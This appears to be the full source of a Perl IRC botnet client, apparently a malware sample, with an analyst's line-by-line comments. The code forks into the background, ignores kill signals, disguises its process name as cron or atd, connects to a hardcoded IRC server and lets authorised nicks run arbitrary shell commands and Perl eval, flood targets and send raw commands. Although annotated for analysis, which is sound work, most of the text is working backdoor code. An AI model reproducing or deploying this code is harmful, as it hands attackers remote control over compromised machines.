#!/usr/bin/perl
my $processo =("[atd]","atd","[cron]","cron","crond","ntpd","[ntpd]"); 

my @titi = ("index.php?page=","main.php?page="); 
#defines an array with common Web application resources and parameters.
my $goni = $titi[rand scalar @titi]; 
# Line 3. defines a variable which will contain one of the web
# resources stored in the previous variable chosen randomly from 
# the array.
my $linas_max='3';
# Line 4. defines a 'maximum number of lines' variable of value 3.
my $sleep='7';
# Line 5. sets a variable 'sleep' with a value of 7.
my @adms=("z", "y" );
# Line 6. defines an array 'adms' with some key letters 'qwerty' +
my @hostauth=("local");
# Line 7. declares a new array called 'hostauth', probably short of
# 'host authentication', with a single value 'local'
my @canais=("#y");
# Line 8. declares an array named 'canais' which translates from
# Portuguese to 'channels'. 
# The variable is initialized with a single value '#y'
chop (my $nick = `uname`);
# The 'chop' function "removes the last character of a string and
# returns that character. If given a list of arguments, the operation
# is performed on each one and the last character chopped is returned.
# It seems this would return a single character. This character is the
# last one from the uname command (name and information of the host in
# which the script is running).
my $servidor="3.4.5.6";
# Line 10. sets a variable that translates to 'server' with a default
# IP address value of 3.4.5.6.
my $ircname =("g");
# Lines 11-13 define parameters related to IRC: name, real name, 
# and port.
my $realname = ("g");
my @ircport = ("6000","6001","6002","6003","6004","6005","6006","6007","6008",
	"6009","6010","4000", "4001", "4002", "4003", "4004", "4005", "4006", 
	"4007", "4008", "4009", "4010", "7000", "7001", "7002", "7003", "7004",
	 "7005", "7006", "7007", "7008", "7009", "7010"); 
my $porta = $ircport[rand scalar @ircport];
# random port number form the ones defined in line 13 (Not much real
# choice there).
my $VERSAO = '0.5';
# Line 15. defines a variable which seems to be storing the version of
# the script: 0.5.
###
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
# Lines 16-20 are for ignoring any significative signal received by 
# the script. 
# INT is for terminal interrupt (e.g. CTRL+C key sequence); 
# HUP is for hang up, "The HUP signal is sent to a process when its
# controlling terminal is closed" [4]; # TERM is a termination signal; 
# CHLD is a signal that indicates that the child process has ended or
# changed; PS doesn't map to any known signal afaik.

use IO::Socket;
use Socket;
#Lines 21-22, import libraries used to create and manipulate sockets.
use IO::Select;
# Line 23. imports a library used to handle system calls.
chdir("/tmp");
# Line 24. forces the script to change the current directory to '/tmp'.
$servidor="$ARGV[0]" if $ARGV[0];
# Line 25. overwrites the content of variable 'servidor', aka 'server',
# if the value was passed as an argument.
$0="$processo"."\0"x16;;
# Line 26. seems to concatenate the value on 'processo', "ps", with
# sixteen "\0", which is an ASCII NUL character. It then assigns this
# value to $0 to rename its own process name.
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);
# Lines 27-29 are typically used to deamonize a script. These
# intructions will create a child process and let the parent exit.[6


our %irc_servers;
our %DCC;
# Lines 30-31 create aliases for the variables (?). 
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
# Lines 32-33 create a new interface for 'Select' system calls.


sub sendraw {   ## This function sends raw information through a socket
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}

my $line_temp;
# The main script is designed to run forever via a simple 
# While True loop
while( 1 ) {
# The first section is about getting a working connection to the 
# IRC server.
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
# The malware instantiates a new server or closes it if there were 
# zero bytes read from it.
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }

# The incoming message read from the server is split in lines
# for further processing
     @lines = split (/\n/, $msg);
# Each line is sent following different logic to the parse() function
     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}






# This functions establishes a connection to a server using information
# passed on parameters e.g conectar("$nick", "$servidor", "$porta");"
sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;

     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);

     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     sleep 1;
   }
}

 
# This function parses single IRC responses and performs different
# actions according to the messages received, the user who sent them
# and the host used. 
sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001");
       }
       if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
       if (grep {$_ =~ /^\Q$pn\E$/i } @adms) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
         }
         if ($args =~ /^(\Q$meunick\E|\!say)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1") unless ($natrix eq "!bot" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         } 
       }
	}
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4; 
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       nick("$meunick|".int rand(999999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $canal (@canais) {
         sendraw("JOIN $canal ddosit");
       }
   }
}


# This function parses different instructions received by the parse()
# function and performs different IRC commands (listed below in lines
# 246-279) 
sub ircase {
  my ($kem, $printl, $case) = @_;

  if ($case =~ /^join (.*)/) {
     j("$1");
   } 

if ($case =~ /^refresh (.*)/) {
my $goni = $titi[rand scalar @titi];
 }

   if ($case =~ /^part (.*)/) {
      p("$1");
   }
   if ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   if ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   if ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   if ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
   }
   if ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   if ($case =~ /^eval (.*)/) {
     eval "$1";
   }
}

# This function receives and executes system commands sent by parse()
# and send the result to a given user, line by line.
sub shell {
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "No such file or directory");
    return;
  } 
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}


sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}  
sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}
sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {
  sendraw("PART $_[0]");
}
sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub quit {
  sendraw("QUIT :$_[0]");
}

